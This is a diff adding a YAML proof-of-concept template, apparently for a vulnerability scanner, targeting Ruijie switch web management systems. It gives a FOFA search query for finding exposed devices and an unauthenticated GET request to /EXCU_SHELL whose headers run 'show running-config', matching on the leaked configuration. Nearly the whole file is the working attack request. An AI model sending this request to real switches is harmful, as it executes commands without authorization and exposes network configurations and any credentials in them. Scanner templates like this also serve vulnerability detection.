@@ -1,0 +1,19 @@
+id: poc-yaml-ruijie-switch-web-management-system-exch-shell-information-leak
+info:
+  name: 锐捷 交换机网络管理系统 EXCU_SHELL 信息泄露漏洞
+  severity: high
+  tags:
+  - 信息泄露
+  finger: 交换机网络管理系统
+  fofa: body="img/free_login_ge.gif" && body="./img/login_bg.gif"
+requests:
+- method: GET
+  path: /EXCU_SHELL
+  headers:
+    Cmdnum: '1'
+    Command1: show running-config
+    Confirm1: n
+  expression: status_code == 200 && contains(body,"Building configuration") && contains(body,"Current
+    configuration") && !contains(body,"<")
+variables: {}
+transport: http
